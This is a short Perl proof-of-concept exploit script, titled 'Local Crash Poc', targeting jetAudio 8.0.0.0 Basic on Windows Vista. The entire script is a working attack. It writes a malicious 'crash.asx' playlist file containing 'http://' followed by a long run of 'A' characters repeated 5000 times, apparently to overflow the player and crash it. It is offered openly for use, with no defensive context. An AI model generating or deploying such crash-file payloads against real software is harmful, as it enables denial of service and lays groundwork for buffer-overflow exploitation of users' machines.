#!/user/bin/perl
# Exploit Title: [Local Crash Poc]
# Date: [Fri/Dec/25/2009]
# Author: [D3V!L FUCKER]
# Software Link: [http://www.jetaudio.com]
# Version: [jetAudio v 8.0.0.0 Basic]
# Tested on: [windows vista sp0]
# Code :
my $file= "crash.asx";

my $boom= "http://"."AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" x 5000;

open($FILE,">>$file");

print $FILE "$boom";

close($FILE);

print "Done..!~#\n";